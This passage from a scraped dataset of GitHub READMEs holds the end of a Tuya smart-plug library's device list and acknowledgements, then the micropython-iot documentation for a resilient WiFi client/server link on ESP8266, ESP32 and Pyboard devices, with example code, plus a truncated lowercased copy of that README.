https://www.amazon.com/gp/product/b075z17987/ref=oh_aui_detailpage_o03_s00?ie=utf8&psc=1\nskyroku sm-pw701u wi-fi plug smart plug - https://wikidevi.com/wiki/xenon_sm-pw701u\nwuudi sm-s0301-us - wifi smart power socket multi plug with 4 ac outlets and 4 usb charging\ngosund sp1 - wifi high amp ratedsmart power socket (eu) (3.3 protocol device) - https://www.amazon.de/steckdose-stromverbrauch-funktion-fernsteurung-netzwerk/dp/b07b911y6v\ngosund - smart light switch (us) (3.3 protocol device) - https://www.amazon.com/gp/product/b07dqg4k52/ref=ppx_yo_dt_b_search_asin_title?ie=utf8&psc=1\ngoklug - smart plug with energy monitoring (us) (3.3 protocol device) - https://www.amazon.com/gp/product/b083sk787x/ref=ppx_yo_dt_b_search_asin_title?ie=utf8&psc=1\ntreatlife wifi light switch 3 way switch (us) (3.3 protocol device) - https://www.amazon.com/gp/product/b07v4x7brt/ref=ppx_yo_dt_b_search_asin_title?ie=utf8&psc=1\nacknowledgements\ntuyaapi https://github.com/codetheweb/tuyapi by codetheweb and blackrozes for protocol reverse engineering, additional protocol reverse engineering from jepsonrob and clach04\npytuya https://github.com/clach04/python-tuya by clach04 the origin of this python module (now abandoned)\nhttps://github.com/rospogrigio/localtuya-homeassistant by rospogrigio edit to pytuya to support devices with device ids of 22 characters\npowermonitor https://github.com/jasonacox/powermonitor\ncontributors\njason a. cox (jasonacox)\nphill healey (codeclinic) - integration for firmware 1.0.5+ / protocol v3.3 & commandline arguments.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000684, "year": null}, {"Unnamed: 0": 686, "autor": 686, "date": null, "content": "Introduction\nThis library provides a resilient full duplex communication link between a WiFi connected board and a server on the wired LAN. The board may be an ESP8266, ESP32 or other target including the Pyboard D. The design is such that the code can run for indefinite periods. Temporary WiFi or server outages are tolerated without message loss.\nThe API is simple and consistent between client and server applications, comprising write and readline methods. The ujson library enables various Python objects to be exchanged. Guaranteed message delivery is available.\nThis project is a collaboration between Peter Hinch and Kevin K\u00f6ck.\nAs of July 2020 it has been updated to use (and require) uasyncio V3. See section 3.1.1 for details of consequent API changes.\n0. MicroPython IOT application design\nIOT (Internet of Things) systems commonly comprise a set of endpoints on a WiFi network. Internet access is provided by an access point (AP) linked to a router. Endpoints run an internet protocol such as MQTT or HTTP and normally run continuously. They may be located in places which are hard to access: reliability is therefore paramount. Security is also a factor for endpoints exposed to the internet.\nUnder MicroPython the available hardware for endpoints is limited. Testing has been done on the ESP8266, ESP32 and the Pyboard D.\nThe ESP8266 remains as a readily available inexpensive device which, with care, is capable of long term reliable operation. It does suffer from limited resources, in particular RAM. Achieving resilient operation in the face of WiFi or server outages is not straightforward: see this document. The approach advocated here simplifies writing robust ESP8266 IOT applications by providing a communications channel with inherent resilience.\nThe usual arrangement for MicroPython internet access is as below.\nRunning internet protocols on ESP8266 nodes has the following drawbacks:\nIt can be difficult to ensure resilience in the face of outages of WiFi and of the remote endpoint.\nRunning TLS on the ESP8266 is demanding in terms of resources: establishing a connection can take 30s.\nThere are potential security issues for internet-facing nodes.\nThe security issue creates a requirement periodically to install patches to firmware or to libraries. This raises the issue of physical access.\nInternet applications can be demanding of RAM.\nThis document proposes an approach where multiple remote nodes communicate with a local server. This runs CPython or MicroPython code and supports the internet protocol required by the application. The server and the remote nodes communicate using a simple protocol based on the exchange of lines of text. The server can run on a Linux box such as a Raspberry Pi; this can run 24/7 at minimal running cost.\nBenefits are:\nSecurity is handled on a device with an OS. Updates are easily accomplished.\nThe text-based protocol minimises the attack surface presented by nodes.\nThe protocol is resilient in the face of outages of WiFi and of the server: barring errors in the application design, crash-free 24/7 operation is a realistic prospect.\nThe amount of code running on the remote is smaller than that required to run a resilient internet protocol such as this MQTT version.\nThe server side application runs on a relatively powerful machine. Even minimal hardware such as a Raspberry Pi has the horsepower easily to support TLS and to maintain concurrent links to multiple client nodes. Use of threading is feasible.\nThe option to use CPython on the server side enables access to the full suite of Python libraries including internet modules.\nThe principal drawback is that in addition to application code on the ESP8266 node, application code is also required on the PC to provide the \"glue\" linking the internet protocol with each of the client nodes. In many applications this code may be minimal.\nThere are use-cases where conectivity is entirely local, for example logging locally acquired data or using some nodes to control and monitor others. In such cases no internet protocol is required and the server side application merely passes data between nodes and/or logs data to disk.\nThis architecture can be extended to non-networked clients such as the Pyboard V1.x. This is described and diagrammed here.\n1. Contents\nThis repo comprises code for resilent full-duplex connections between a server application and multiple clients. Each connection is like a simplified socket, but one which persists through outages and offers guaranteed message delivery.\nMicroPython IOT application design\nContents\nDesign\n2.1 Protocol\nFiles and packages\n3.1 Installation\n3.1.1 Existing users\n3.1.2 Firmware and dependency\n3.1.3 Preconditions for demos\n3.2 Usage\n3.2.1 The main demo\n3.2.2 The remote control demo\n3.2.3 Quality of Service demo\n3.2.4 The fast qos demo\n3.2.5 Troubleshooting the demos\nClient side applications\n4.1 The Client class\n4.1.1 Initial Behaviour\n4.1.2 Watchdog Timer\nServer side applications\n5.1 The server module\nEnsuring resilience Guidelines for application design.\nQuality of service Guaranteeing message delivery.\n7.1 The qos argument\n7.2 The wait argument Concurrent writes of qos messages.\nPerformance\n8.1 Latency and throughput\n8.2 Client RAM utilisation\n8.3 Platform reliability\nExtension to the Pyboard\nHow it works\n10.1 Interface and client module\n10.2 Server module\n2. Design\nThe code is asynchronous and based on asyncio. Client applications on the remote import client.py which provides the interface to the link. The server side application uses server.py.\nMessages are required to be complete lines of text. They typically comprise an arbitrary Python object encoded using JSON. The newline character ('\\n') is not allowed within a message but is optional as the final character.\nGuaranteed message delivery is supported. This is described in section 7. Performance limitations are discussed in section 8.\n2.1 Protocol\nClient and server applications use readline and write methods to communicate: in the case of an outage of WiFi or the connected endpoint, the method will pause until the outage ends. While the system is tolerant of runtime server and WiFi outages, this does not apply on initialisation. The server must accessible before clients are started.\nThe link status is determined by periodic exchanges of keepalive messages. This is transparent to the application. If a keepalive is not received within a user specified timeout an outage is declared. On the client the WiFi is disconnected and a reconnection procedure is initiated. On the server the connection is closed and it awaits a new connection.\nEach client has a unique ID which is an arbitrary string. In the demo programs this is stored in local.py. The ID enables the server application to determine which physical client is associated with an incoming connection.\nContents\n3. Files and packages\nThis repo has been updated for uasyncio V3. This is incorporated in daily builds of firmware and will be available in release builds later than V1.12. Server code may be run under CPython V3.8 or above. It may be run under MicroPython (Unix build), but at the time of writing this requires this fix to incorporate uasyncio.\nDirectory iot:\nclient.py / client.mpy Client module. The ESP8266 has insufficient RAM to compile client.py so the precompiled client.mpy should be used. See note below.\nserver.py Server module. (runs under CPython 3.5+ or MicroPython 1.10+). Directory iot/primitives:\n__init__.py Functions common to Client and Server.\nswitch.py Debounced switch interface. Used by remote demo. Optional directories containing Python packages:\niot/examples A simple example. Up to four clients communicate with a single server instance.\niot/remote Demo uses the library to enable one client to control another. This may need adapting for your hardware.\niot/qos Demonstrates and tests the qos (quality of service) feature, see Quality of service.\niot/pb1 Contians packages enabling a Pyboard V1.x to communicate with the server via an ESP8266 connected by I2C. See documentation.\nNOTE: The file client.mpy works with daily builds at the time of writing. The bytecode format changes occasionally. If an application throws a bytecode error it is necessary to cross-compile client.py with the associated version of mpy-cross. Or raise an issue and I will post an update.\n3.1 Installation\nThis section describes the installation of the library and the demos. The ESP8266 has limited RAM: there are specific recommendations for installation on that platform.\n3.1.1 Existing users\nIt is recommended to remove the old version and re-install as below.\nThere have been API changes to accommodate the new uasyncio version: the event loop argument is no longer required or accepted in Client and Server constructors. The directory structure has changed, requiring minor changes to import statements.\n3.1.2 Firmware and dependency\nOn ESP8266, RAM can be saved by building firmware from source, freezing client.py as bytecode. If this is not done, it is necessary to cross compile client.py. The file client.mpy is provided for those unable to do this. If freezing, create an iot directory in your modules directory and copy iot/client.py and the directory iot/primitives and contents there.\nPre-requisites: firmware must be a current daily build or a release build after V1.12. If upgrading, particularly on an ESP8266, it is wise to erase flash prior to installtion. In particular this will ensure the use of littlefs with its associated RAM saving.\nThis repository is a python package, consequently on the client the directory structure must be retained. The following installs all demos on the target.\nOn your PC move to a directory of your choice and clone the repository there:\ngit clone https://github.com/peterhinch/micropython-iot\nInstallation consists of copying the iot directory and contents to an iot directory on the boot device. On ESP8266 or ESP32 the boot device is/pyboard. On the Pyboard D it will be /flash or /sd depending on whether an SD card is fitted.\nCopying may be done using any tool but I recommend rshell. If this is used start in the directory on your PC containing the clone, start rshell and issue (adapting the boot device for your platform):\nrsync iot /pyboard/iot\nOn ESP8266, unless frozen, it is necessary to delete client.py to force the use of client.mpy:\nrm /pyboard/iot/client.py\n3.1.3 Preconditions for demos\nThe demo programs store client configuration data in a file local.py. Each demo has its own local.py located in the directory of the demo code. This contains the following constants which should be edited to match local conditions. Remove the use_my_local hack designed for my WiFi privacy.:\nMY_ID = '1' # Client-unique string.\nSERVER = '192.168.0.10' # Server IP address.\nSSID = 'use_my_local' # Insert your WiFi credentials\nPW = 'PASSWORD'\nPORT = 8123\nTIMEOUT = 2000\n# The following may be deleted\nif SSID == 'use_my_local':\nfrom iot.examples.my_local import *\nThe ESP8266 can store WiFi credentials in flash memory. If desired, ESP8266 clients can be initialised to connect to the local network prior to running the demos. In this case the SSID and PW variables may optionally be empty strings (SSID = '').\nNote that the server-side examples below specify python3 in the run command. In every case micropython may be substituted to run under the Unix build of MicroPython.\n3.2 Usage\n3.2.1 The main demo\nThis illustrates up to four clients communicating with the server. The demo expects the clients to have ID's in the range 1 to 4: if using multiple clients edit each one's local.py accordingly.\nOn the server navigate to the parent directory of iot and run:\npython3 -m iot.examples.s_app_cp\nor\nmicropython -m iot.examples.s_app_cp\nOn each client run:\nimport iot.examples.c_app\n3.2.2 The remote control demo\nThis shows one ESP8266 controlling another. The transmitter should have a pushbutton between GPIO 0 and gnd, both should have an LED on GPIO 2.\nOn the server navigate to the parent directory of iot and run:\npython3 -m iot.remote.s_comms_cp\nor\nmicropython -m iot.remote.s_comms_cp\nOn the esp8266 run (on transmitter and receiver respectively):\nimport iot.remote.c_comms_tx\nimport iot.remote.c_comms_rx\n3.2.3 Quality of Service demo\nThis test program verifies that each message (in each direction) is received exactly once. On the server navigate to the parent directory of iot and run:\npython3 -m iot.qos.s_qos_cp\nor\nmicropython -m iot.qos.s_qos_cp\nOn the client, after editing /pyboard/qos/local.py, run:\nimport iot.qos.c_qos\n3.2.4 The fast qos demo\nThis tests the option of concurrent qos writes. This is an advanced feature discussed in section 7.1. To run the demo, on the server navigate to the parent directory of iot and run:\npython3 -m iot.qos.s_qos_fast\nor\nmicropython -m iot.qos.s_qos_fast\nOn the client, after editing /pyboard/qos/local.py, run:\nimport iot.qos.c_qos_fast\n3.2.5 Troubleshooting the demos\nIf local.py specifies an SSID, on startup the demo programs will pause indefinitely if unable to connect to the WiFi. If SSID is an empty string the assumption is an ESP8266 with stored credentials; if this fails to connect an OSError will be thrown. An OSError will also be thrown if initial connectivity with the server cannot be established.\nContents\n4. Client side applications\nA client-side application instantiates a Client and launches a coroutine which awaits it. After the pause the Client has connected to the server and communication can begin. This is done using Client.write and Client.readline methods.\nEvery client ha a unique ID (MY_ID) typically stored in local.py. The ID comprises a string subject to the same constraint as messages:\nMessages comprise a single line of text; if the line is not terminated with a newline ('\\n') the client library will append it. Newlines are only allowed as the last character. Blank lines will be ignored.\nA basic client-side application has this form:\nimport uasyncio as asyncio\nimport ujson\nfrom iot import client\nimport local # or however you configure your project\nclass App:\ndef __init__(self, verbose):\nself.cl = client.Client(local.MY_ID, local.SERVER,\nlocal.PORT, local.SSID, local.PW,\nlocal.TIMEOUT, conn_cb=self.state,\nverbose=verbose)\nasyncio.create_task(self.start())\nasync def start(self):\nawait self.cl # Wait until client has connected to server\nasyncio.create_task(self.reader())\nawait self.writer() # Wait forever\ndef state(self, state): # Callback for change in connection status\nprint(\"Connection state:\", state)\nasync def reader(self):\nwhile True:\nline = await self.cl.readline() # Wait until data received\ndata = ujson.loads(line)\nprint('Got', data, 'from server app')\nasync def writer(self):\ndata = [0, 0]\ncount = 0\nwhile True:\ndata[0] = count\ncount += 1\nprint('Sent', data, 'to server app\\n')\nawait self.cl.write(ujson.dumps(data))\nawait asyncio.sleep(5)\ndef close(self):\nself.cl.close()\napp = None\nasync def main():\nglobal app # For closure by finally clause\napp = App(True)\nawait app.start() # Wait forever\ntry:\nasyncio.run(main())\nfinally:\napp.close() # Ensure proper shutdown e.g. on ctrl-C\nasyncio.new_event_loop()\nIf an outage of server or WiFi occurs, the write and readline methods will pause until connectivity has been restored. The server side API is similar.\nContents\n4.1 The Client class\nThe constructor has a substantial number of configuration options but in many cases defaults may be accepted for all but the first five.\nConstructor args:\nmy_id The client id.\nserver The server IP-Adress to connect to.\nport=8123 The port the server listens on.\nssid='' WiFi SSID. May be blank for ESP82666 with credentials in flash.\npw='' WiFi password.\ntimeout=2000 Connection timeout in ms. If a connection is unresponsive for longer than this period an outage is assumed.\nconn_cb=None Callback or coroutine that is called whenever the connection changes.\nconn_cb_args=None Arguments that will be passed to the connected_cb callback. The callback will get these args preceeded by a bool indicating the new connection state.\nverbose=False Provides optional debug output.\nled=None If a Pin instance is passed it will be toggled each time a keepalive message is received. Can provide a heartbeat LED if connectivity is present. On Pyboard D a Pin or LED instance may be passed.\nwdog=False If True a watchdog timer is created with a timeout of 20s. This will reboot the board if it crashes - the assumption is that the application will be restarted via main.py.\nMethods (asynchronous):\nreadline No args. Pauses until data received. Returns a line.\nwrite Args: buf, qos=True, wait=True. buf holds a line of text.\nIf qos is set, the system guarantees delivery. If it is clear messages may (rarely) be lost in the event of an outage.\nThe wait arg determines the behaviour when multiple concurrent writes are launched with qos set. See Quality of service.\nThe following asynchronous methods are described in Initial Behaviour below. In most cases they can be ignored. 3. bad_wifi 4. bad_server\nMethods (synchronous):\nstatus Returns True if connectivity is present. May also be read using function call syntax (via __call__).\nclose Closes the socket. Should be called in the event of an exception such as a ctrl-c interrupt. Also cancels the WDT in the case of a software WDT.\nBound variable:\nconnects The number of times the Client instance has connected to WiFi. This is maintained for information only and provides some feedback on the reliability of the WiFi radio link.\nThe Client class is awaitable. If\nawait client_instance\nis issued, the coroutine will pause until connectivity is (re)established.\nApplications which always await the write method do not need to check or await the client status: write will pause until it can complete. If write is launched using create_task it is essential to check status otherwise during an outage unlimited numbers of coroutines will be created.\nThe client buffers up to 20 incoming messages. To avoid excessive queue growth applications should have a single coroutine which spends most of its time awaiting incoming data.\nContents\n4.1.1 Initial Behaviour\nWhen an application instantiates a Client it attemps to connect to WiFi and then to the server. Initial connection is handled by the following Client asynchronous bound methods (which may be modified by subclassing):\nbad_wifi No args.\nbad_server No args. Awaited if server refuses an initial connection.\nNote that, once a server link has been initially established, these methods will not be called: reconnection after outages of WiFi or server are automatic.\nThe bad_wifi coro attempts to connect using the WiFi credentials passed to the constructor. This will pause until a connection has been achieved. The bad_server coro raises an OSError. Behaviour of either of these may be modified by subclassing.\nPlatforms other than ESP8266 launch bad_wifi unconditionally on startup. In the case of an ESP8266 which has WiFi credentials stored in flash it will first attempt to connect using that data, only launching bad_wifi if this fails in a timeout period. This is to minimise flash wear.\n4.1.2 Watchdog Timer\nThis option provides a last-ditch protection mechanism to keep a client running in the event of a crash. The ESP8266 can (rarely) crash, usually as a result of external electrical disturbance. The WDT detects that the Client code is no longer running and issues a hard reset. Note that this implies a loss of program state. It also assumes that main.py contains a line of code which will restart the application.\nDebugging code with a WDT can be difficult because bugs or software interrupts will trigger unexpected resets. It is recommended not to enable this option until the code is stable.\nOn the ESP8266 the WDT uses a sofware timer: it can be cancelled which simplifies debugging. See examples/c_app.py for the use of the close method in a finally clause.\nThe WDT on the Pyboard D is a hardware implementation: it cannot be cancelled. It may be necessary to use safe boot to bypass main.py to access the code.\nContents\n5. Server side applications\nA typical example has an App class with one instance per physical client device. This enables instances to share data via class variables. Each instance launches a coroutine which acquires a Connection instance for its individual client (specified by its client_id). This process will pause until the client has connected with the server. Communication is then done using the readline and write methods of the Connection instance.\nMessages comprise a single line of text; if the line is not terminated with a newline (\\n) the server library will append it. Newlines are only allowed as the last character. Blank lines will be ignored.\nA basic server-side application has this form:\nimport asyncio\nimport json\nfrom iot import server\nimport local # or however you want to configure your project\nclass App:\ndef __init__(self, client_id):\nself.client_id = client_id # This instance talks to this client\nself.conn = None # Will be Connection instance\nself.data = [0, 0, 0] # Exchange a 3-list with remote\nasyncio.create_task(self.start())\nasync def start(self):\n# await connection from the specific EP8266 client\nself.conn = await server.client_conn(self.client_id)\nasyncio.create_task(self.reader())\nasyncio.create_task(self.writer())\nasync def reader(self):\nwhile True:\n# Next line will pause for client to send a message. In event of an\n# outage it will pause for its duration.\nline = await self.conn.readline()\nself.data = json.loads(line)\nprint('Got', self.data, 'from remote', self.client_id)\nasync def writer(self):\ncount = 0\nwhile True:\nself.data[0] = count\ncount += 1\nprint('Sent', self.data, 'to remote', self.client_id, '\\n')\nawait self.conn.write(json.dumps(self.data)) # May pause in event of outage\nawait asyncio.sleep(5)\nasync def main():\nclients = {1, 2, 3, 4}\napps = [App(n) for n in clients] # Accept 4 clients with ID's 1-4\nawait server.run(clients, True, local.PORT, local.TIMEOUT) # Verbose\ndef run():\ntry:\nasyncio.run(main())\nexcept KeyboardInterrupt: # Delete this if you want a traceback\nprint('Interrupted')\nfinally:\nserver.Connection.close_all()\nasyncio.new_event_loop()\nif __name__ == \"__main__\":\nrun()\n5.1 The server module\nServer-side applications should create and run a server.run task. This runs forever and takes the following args:\nexpected A set of expected client ID strings.\nverbose=False If True output diagnostic messages.\nport=8123 TCP/IP port for connection. Must match clients.\ntimeout=2000 Timeout for outage detection in ms. Must match the timeout of all Client instances.\nThe expected arg causes the server to produce a warning message if an unexpected client connects, or if multiple clients have the same ID (this will cause tears before bedtime).\nThe module is based on the Connection class. A Connection instance provides a communication channel to a specific client. The Connection instance for a given client is a singleton and is acquired by issuing\nconn = await server.client_conn(client_id)\nThis will pause until connectivity has been established. It can be issued at any time: if the Connection has already been instantiated, that instance will be returned. The Connection constructor should not be called by applications.\nThe Connection instance\nMethods (asynchronous):\nreadline No args. Pauses until data received. Returns a line.\nwrite Args: buf, qos=True, wait=True. buf holds a line of text.\nIf qos is set, the system guarantees delivery. If it is clear messages may (rarely) be lost in the event of an outage.__ The wait arg determines the behaviour when multiple concurrent writes are launched with qos set. See Quality of service.\nMethods (synchronous):\nstatus Returns True if connectivity is present. The connection state may also be retrieved using function call syntax (via .__call__).\n__getitem__ Enables the Connection of another client to be retrieved using list element access syntax. Will throw a KeyError if the client is unknown (has never connected).\nClass Method (synchronous):\nclose_all No args. Closes all sockets: call on exception (e.g. ctrl-c).\nBound variable:\nnconns Maintains a count of (re)connections for information or monitoring of outages.\nThe Connection class is awaitable. If\nawait connection_instance\nis issued, the coroutine will pause until connectivity is (re)established.\nApplications which always await the write method do not need to check or await the server status: write will pause until it can complete. If write is launched using create_task it is essential to check status otherwise during an outage unlimited numbers of coroutines will be created.\nThe server buffers incoming messages but it is good practice to have a coro which spends most of its time waiting for incoming data.\nServer module coroutines:\nrun Args: expected verbose=False port=8123 timeout=2000 This is the main coro and starts the system. expected is a set containing the ID's of all clients.\nverbose causes debug messages to be printed.\nport is the port to listen to.\ntimeout is the number of ms that can pass without a keepalive until the connection is considered dead.\nclient_conn Arg: client_id. Pauses until the sepcified client has connected. Returns the Connection instance for that client.\nwait_all Args: client_id=None peers=None. See below.\nThe wait_all coroutine is intended for applications where clients communicate with each other. Typical user code cannot proceed until a given set of clients have established initial connectivity.\nwait_all, where a client_id is specified, behaves as client_conn except that it pauses until further clients have also connected. If a client_id is passed it will returns that client's Connection instance. If None is passed the assumption is that the current client is already connected and the coro returns None.\nThe peers argument defines which clients it must await: it must either be None or a set of client ID's. If a set of client_id values is passed, it pauses until all clients in the set have connected. If None is passed, it pauses until all clients specified in run's expected set have connected.\nIt is perhaps worth noting that the user application can impose a timeout on this by means of asyncio.wait_for.\nContents\n6. Ensuring resilience\nThere are two principal ways of provoking LmacRxBlk errors and crashes.\nFailing to close sockets when connectivity is lost.\nFeeding excessive amounts of data to a socket after connectivity is lost: this causes an overflow to an internal ESP8266 buffer.\nThese modules aim to address these issues transparently to application code, however it is possible to write applications which violate 2.\nThere is a global TIMEOUT value defined in local.py which should be the same for the server and all clients. Each end of the link sends a keepalive (KA) packet (an empty line) at a rate guaranteed to ensure that at least one KA will be received in every TIMEOUT period. If it is not, connectivity is presumed lost and both ends of the interface adopt a recovery procedure.\nIf an application always awaits a write with qos==True there is no risk of Feeding excess data to a socket: this is because the coroutine does not return until the remote endpoint has acknowledged reception.\nOn the other hand if multiple messages are sent within a timeout period with qos==False there is a risk of buffer overflow in the event of an outage.\nContents\n7. Quality of service\nIn the presence of a stable WiFi link TCP/IP should ensure that packets sent are received intact. In the course of extensive testing with the ESP8266 we found that (very rarely) packets were lost. It is not known whether this behavior is specific to the ESP8266. Another mechanism for message loss is the case where a message is sent in the interval between an outage occurring and it being detected. This is likely to occur on all platforms.\nThe client and server modules avoid message loss by the use of acknowledge packets: if a message is not acknowledged within a timeout period it is retransmitted. This implies duplication where the acknowledge packet is lost. Receive message de-duplication is employed to provide a guarantee that the message will be delivered exactly once. While delivery is guaranteed, timeliness is not. Messages are inevitably delayed for the duration of a WiFi or server outage where the write coroutine will pause for the duration.\nGuaranteed delivery involves a tradeoff against throughput and latency. This is managed by optional arguments to .write, namely qos=True and wait=True.\n7.1 The qos argument\nMessage integrity is determined by the qos argument. If False message delivery is not guaranteed. A use-case for disabling qos is in applications such as remote control. If the user presses a button and nothing happens they would simply repeat the action. Such messages are always sent immediately: the application should limit the rate at which they can be sent, particularly on ESP8266 clients, to avoid risk of buffer overflow.\nWith qos set, the message will be delivered exactly once.\nWhere successive qos messages are sent there may be a latency issue. By default the transmission of a qos message will be delayed until reception of its predecessor's acknowledge. Consequently the write coroutine will pause, introducing latency. This serves two purposes. Firstly it ensures that messages are received in the order in which they were sent (see below).\nSecondly consider the case where an outage has occurred but has not yet been detected. The first message is written, but no acknowledge is received. Subsequent messages are delayed, precluding the risk of ESP8266 buffer overflows. The interface resumes operation after the outage has cleared.\n7.2 The wait argument\nThis default can be changed with the wait argument to write. If False a qos message will be sent immediately, even if acknowledge packets from previous messages are pending. Applications should be designed to limit the number of such qos messages sent in quick succession: on ESP8266 clients buffer overflows can occur.\nIn testing in 2019 the ESP32 was not resilient under these circumstances; this appears to have been fixed in current firmware builds. Nevertheless setting wait=False potentially risks resilience. If used, applications should be tested to verify quality of service in the presence of WiFi outages.\nIf messages are sent with wait=False there is a chance that they may not be received in the order in which they were sent. As described above, in the event of qos message loss, retransmission occurs after a timeout period has elapsed. During that timeout period the application may have successfully sent another non-waiting qos message resulting in out of order reception.\nThe demo programs qos/c_qos_fast.py (client) and qos/s_qos_fast.py issue four write operations with wait=False in quick succession. This number is probably near the maximum on an ESP8266. Note the need explicitly to check for connectivity before issuing the write: this is to avoid spawning large numbers of coroutines during an outage.\nIn summary specifying wait=False should be considered an \"advanced\" option requiring testing to prove that resilence is maintained.\nContents\n8. Performance\n8.1 Latency and throughput\nThe interface is intended to provide low latency: if a switch on one node controls a pin on another, a reasonably quick response can be expected. The link is not designed for high throughput because of the buffer overflow issue discussed in section 6. This is essentially a limitation of the ESP8266 device: more agressive use of the wait arg may be possible on platforms such as the Pyboard D.\nIn practice latency on the order of 100-200ms is normal; if an outage occurs latency will inevitably persist for the duration.\nTIMEOUT\nThis defaults to 2s. On Client it is a constructor argument, on the server it is an arg to server.run. Its value should be common to all clients and the sever. It determines the time taken to detect an outage and the frequency of keepalive packets. This time was chosen on the basis of measured latency periods on WiFi networks. It may be increased at the expense of slower outage detection. Reducing it may result in spurious timeouts with unnecessary WiFi reconnections.\n8.2 Client RAM utilisation\nOn ESP8266 with a current (June 2020) daily build the demo reports over 20KB free. Free RAM of 25.9KB was achieved with compiled firmware with frozen bytecode as per Installation.\n8.3 Platform reliability\nIn extensive testing the Pyboard D performed impeccably: no failures of any kind were observed in weeks of testing through over 1000 outages.\nESP32 was prone to occasional spontaneous reboots. It would typically run for a few days through multiple WiFi outages before rebooting.\nESP8266 still occasionally crashes and it is recommended to use the watchdog feature to reboot it should this occur.\nIt would take a very long time to achieve more than a subjective impression of the effectof usage options on failure rate. The precautionary principle suggests maximising free ram with frozen bytecode on ESP8266 and avoiding concurrent qos==1 writes on ESPx platforms.\nContents\n9. Extension to the Pyboard\nThis extends the resilient link to MicroPython targets lacking a network interface; for example the Pyboard V1.x. Connectivity is provided by an ESP8266 running a fixed firmware build: this needs no user code.\nThe interface between the Pyboard and the ESP8266 uses I2C and is based on the existing I2C module.\nResilient behaviour includes automatic recovery from WiFi and server outages; also from ESP8266 crashes.\nSee documentation.\n10. How it works\n10.1 Interface and client module\nThe client module was designed on the expectation that client applications will usually be simple: acquiring data from sensors and periodically sending it to the server and/or receiving data from the server and using it to control devices. Developers of such applications probably don't need to be concerned with the operation of the module.\nThere are ways in which applications can interfere with the interface's operation either by blocking or by attempting to operate at excessive data rates. Such designs can produce an erroneous appearance of poor WiFi connectivity.\nOutages are detected by a timeout of the receive tasks at either end. Each peer sends periodic keepalive messages consisting of a single newline character, and each peer has a continuously running read task. If no message is received in the timeout period (2s by default) an outage is declared.\nFrom the client's perspective an outage may be of the WiFi or the server. In practice WiFi outages are more common: server outages on a LAN are typically caused by the developer testing new code. The client assumes a WiFi outage. It disconnects from the network for long enough to ensure that the server detects the outage. It then attempts repeatedly to reconnect. When it does so, it checks that the connection is stable for a period (it might be near the limit of WiFi range).\nIf this condition is met it attempts to reconnect to the server. If this succeeds the client runs. Its status becomes True when it first receives data from the server.\nA client or server side application which blocks or hogs processor time can prevent the timely transmission of keepalive messages. This will cause the server to declare an outage: the consequence is a sequence of disconnect and reconnect events even in the presence of a strong WiFi signal.\n10.2 Server module\nServer-side applications communicate via a Connection instance. This is unique to a client. It is instantiated when a specified client first connects and exists forever. During an outage its status becomes False for the duration. The Connection instance is retrieved as follows, with the client_conn method pausing until initial connectivity has been achieved:\nimport server\n# Class details omitted\nself.conn = await server.client_conn(self.client_id)\nEach client must have a unique ID. When the server detects an incoming connection on the port it reads the client ID from the client. If a Connection instance exists for that ID its status is updated, otherwise a Connection is instantiated.\nThe Connection has a continuously running coroutine ._read which reads data from the client. If an outage occurs it calls the ._close method which closes the socket, setting the bound variable ._sock to None. This corresponds to a False status. The ._read method pauses until a new connection occurs. The aim here is to read data from ESP8266 clients as soon as possible to minimise risk of buffer overflows.\nThe Connection detects an outage by means of a timeout in the ._read method: if no data or keepalive is received in that period an outage is declared, the socket is closed, and the Connection status becomes False.\nThe Connection has a ._keepalive method. This regularly sends keepalive messages to the client. Application code which blocks the scheduler can cause this not to be scheduled in a timely fashion with the result that the client declares an outage and disconnects. The consequence is a sequence of disconnect and reconnect events even in the presence of a strong WiFi signal.", "link": "https://github.com/peterhinch/micropython-iot", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "introduction\nthis library provides a resilient full duplex communication link between a wifi connected board and a server on the wired lan. the board may be an esp8266, esp32 or other target including the pyboard d. the design is such that the code can run for indefinite periods. temporary wifi or server outages are tolerated without message loss.\nthe api is simple and consistent between client and server applications, comprising write and readline methods. the ujson library enables various python objects to be exchanged. guaranteed message delivery is available.\nthis project is a collaboration between peter hinch and kevin k\u00f6ck.\nas of july 2020 it has been updated to use (and require) uasyncio v3. see section 3.1.1 for details of consequent api changes.\n0. micropython iot application design\niot (internet of things) systems commonly comprise a set of endpoints on a wifi network. internet access is provided by an access point (ap) linked to a router. endpoints run an internet protocol such as mqtt or http and normally run continuously. they may be located in places which are hard to access: reliability is therefore paramount. security is also a factor for endpoints exposed to the internet.\nunder micropython the available hardware for endpoints is limited. testing has been done on the esp8266, esp32 and the pyboard d.\nthe esp8266 remains as a readily available inexpensive device which, with care, is capable of long term reliable operation. it does suffer from limited resources, in particular ram. achieving resilient operation in the face of wifi or server outages is not straightforward: see this document. the approach advocated here simplifies writing robust esp8266 iot applications by providing a communications channel with inherent resilience.\nthe usual arrangement for micropython internet access is as below.\nrunning internet protocols on esp8266 nodes has the following drawbacks:\nit can be difficult to ensure resilience in the face of outages of wifi and of the remote endpoint.\nrunning tls on the esp8266 is demanding in terms of resources: establishing a connection can take 30s.\nthere are potential security issues for internet-facing nodes.\nthe security issue creates a requirement periodically to install patches to firmware or to libraries. this raises the issue of physical access.\ninternet applications can be demanding of ram.\nthis document proposes an approach where multiple remote nodes communicate with a local server. this runs cpython or micropython code and supports the internet protocol required by the application. the server and the remote nodes communicate using a simple protocol based on the exchange of lines of text. the server can run on a linux box such as a raspberry pi; this can run 24/7 at minimal running cost.\nbenefits are:\nsecurity is handled on a device with an os. updates are easily accomplished.\nthe text-based protocol minimises the attack surface presented by nodes.\nthe protocol is resilient in the face of outages of wifi and of the server: barring errors in the application design, crash-free 24/7 operation is a realistic prospect.\nthe amount of code running on the remote is smaller than that required to run a resilient internet protocol such as this mqtt version.\nthe server side application runs on a relatively powerful machine. even minimal hardware such as a raspberry pi has the horsepower easily to support tls and to maintain concurrent links to multiple client nodes. use of threading is feasible.\nthe option to use cpython on the server side enables access to the full suite of python libraries including internet modules.\nthe principal drawback is that in addition to application code on the esp8266 node, application code is also required on the pc to provide the \"glue\" linking the internet protocol with each of the client nodes. in many applications this code may be minimal.\nthere are use-cases where conectivity is entirely local, for example logging locally acquired data or using some nodes to control and monitor others. in such cases no internet protocol is required and the server side application merely passes data between nodes and/or logs data to disk.\nthis architecture can be extended to non-networked clients such as the pyboard v1.x. this is described and diagrammed here.\n1. contents\nthis repo comprises code for resilent full-duplex connections between a server application and multiple clients. each connection is like a simplified socket, but one which persists through outages 